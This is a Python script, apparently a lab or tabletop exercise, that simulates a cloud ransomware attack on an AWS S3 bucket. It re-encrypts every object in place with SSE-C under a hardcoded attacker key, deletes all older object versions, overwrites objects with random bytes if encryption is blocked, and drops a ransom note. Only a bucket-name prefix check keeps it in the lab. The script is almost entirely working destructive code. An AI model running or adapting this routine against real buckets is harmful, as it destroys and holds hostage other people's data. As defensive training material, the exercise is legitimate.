#!/usr/bin/env python3
"""
Ransom in the Clouds — the Kraken's SSE-C playbook (SIMULATION, run ONLY against your own lab bucket).

This mirrors the publicly reported early-2025 campaign against S3: a threat actor with stolen
credentials that allow s3:GetObject + s3:PutObject rewrites every object in place using SSE-C
(server-side encryption with a CUSTOMER-PROVIDED key). AWS performs the AES-256 encryption but
never stores the key — only an HMAC of it — so without the attacker's key, nobody can read the data.
Then the attacker tries to remove older versions and drops a ransom note.

  python3 kraken_ransom.py --bucket $BUCKET

Safety: refuses to run against buckets that don't start with 'nimbus-cargo-'.
"""
import argparse, os, sys
import boto3
from botocore.exceptions import ClientError

# 32 bytes = AES-256. In the real campaign the key is generated per-victim and kept by the attacker.
KRAKEN_KEY = b"KRAKEN-COLLECTIVE-0wns-ur-cargo!"
assert len(KRAKEN_KEY) == 32

NOTE = """\
YOUR CARGO HAS BEEN ENCRYPTED BY THE KRAKEN COLLECTIVE.
AWS cannot help you: they never saw our key.
Send 40,000 space-credits within 7 days or we let the lifecycle policy eat everything.
"""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bucket", required=True)
    ap.add_argument("--region", default=os.environ.get("AWS_REGION", "us-east-1"))
    a = ap.parse_args()
    if not a.bucket.startswith("nimbus-cargo-"):
        sys.exit("refusing: this simulator only touches lab buckets named nimbus-cargo-*")
    s3 = boto3.client("s3", region_name=a.region)

    keys = [o["Key"] for o in s3.list_objects_v2(Bucket=a.bucket).get("Contents", [])]
    print(f"[kraken] found {len(keys)} objects. encrypting with SSE-C...")
    blocked = 0
    for k in keys:
        try:
            # boto3 base64-encodes the key and computes the MD5 header for us.
            s3.copy_object(Bucket=a.bucket, Key=k, CopySource={"Bucket": a.bucket, "Key": k},
                           SSECustomerAlgorithm="AES256", SSECustomerKey=KRAKEN_KEY,
                           MetadataDirective="REPLACE", Metadata={"kraken": "was-here"})
            print(f"  [+] {k} -> SSE-C (attacker key)")
        except ClientError as e:
            blocked += 1
            msg = e.response['Error'].get('Message', '')
            # AWS puts the interesting part (WHICH policy type denied) at the END of the message.
            short = msg if len(msg) <= 110 else msg[:36] + " … " + msg[-70:]
            print(f"  [x] {k} blocked: {e.response['Error']['Code']} — {short}")

    if blocked == len(keys) and keys:
        print("[kraken] every SSE-C write was refused. Either your RCP/SCP/bucket policy works,")
        print("         or this bucket already blocks SSE-C by platform default. Either way: the Kraken weeps.")
        print("[kraken] falling back to TABLETOP mode: overwriting objects with garbage so you can still practice recovery.")
        for k in keys:
            try:
                s3.put_object(Bucket=a.bucket, Key=k, Body=os.urandom(256), Metadata={"kraken": "was-here"})
            except ClientError as e:
                print(f"  [x] {k}: {e.response['Error']['Code']}")

    print("[kraken] deleting older versions so there is no way back...")
    for v in s3.list_object_versions(Bucket=a.bucket).get("Versions", []):
        if v["IsLatest"]:
            continue
        try:
            s3.delete_object(Bucket=a.bucket, Key=v["Key"], VersionId=v["VersionId"])
            print(f"  [+] destroyed {v['Key']}@{v['VersionId'][:8]}")
        except ClientError as e:
            print(f"  [x] could not destroy {v['Key']}@{v['VersionId'][:8]}: {e.response['Error']['Code']}")

    s3.put_object(Bucket=a.bucket, Key="README-RANSOM.txt", Body=NOTE.encode())
    print("[kraken] ransom note dropped. muahaha.")


if __name__ == "__main__":
    main()
